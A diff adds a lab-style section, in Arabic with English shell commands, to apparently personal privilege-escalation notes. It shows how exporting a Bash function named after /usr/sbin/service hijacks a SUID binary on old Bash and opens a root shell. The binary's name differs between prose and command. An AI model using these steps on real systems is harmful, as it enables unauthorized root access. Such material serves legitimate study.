@@ -537,6 +537,43 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 * <details>
      <summary>Abusing Shell Features (#1)</summary>
+
+
+   # SUID/SGID Abusing - ShellShock Partners #1
+
+   ### 11) SUID/SGID Abusing - ShellShock Partners #1
+
+   * استغلال ثغرة في إصدارات `Bash` قبل الـ `4.2-048` تكمن باسم `ShellShock Function import`. والتي تسمح للمهاجم بتعريف دالة `Bash` تحمل نفس اسم مسار، تنفيذ برنامج معين
+   * ثم تصديرها بحيث تستخدم بدلا من البرنامج الاصلى عند استدعائه.
+   * في الملف `/usr/local/bin/suid-env2` له نفس صلاحيات `suid/sgid` مثل الملف السابق لكن الفرق أنه بيشغل المسار كامل.
+
+   * `/bin/bash --version`
+       * Output might be something like `4.1.5` -> (إصدار Bash قديم)
+
+   * Define a function with the same name as the command path:
+       ```bash
+       function /usr/sbin/service { /bin/bash -p; }
+       ```
+
+   * Export the function:
+       ```bash
+       export -f /usr/sbin/service
+       ```
+       * (هذا الكود سيقوم بتعريف دالة في `bash` تحمل اسم `/usr/sbin/service` و عند تشغيلها . تقوم بفتح `Bash Shell` بصلاحيات محفوظه (`-p`)
+       * ثم تصدير الداله مما يجعلها تستخدم بدلا من استخدام ``/usr/sbin/service`` عند استدعاؤها)
+
+   * Run the SUID executable:
+       ```bash
+       /usr/local/bin/suid-env-2
+       ```
+       * (تشغيل الملف الذي سيستدعي `service` الذي تم حقنه ليشغل `Bash Shell` ويأخذنا إلى صلاحيات `root`)
+
+   * `whoami`
+       * `root`
+       * (مبروك!!!)
+
+
+
   </details>
 
 
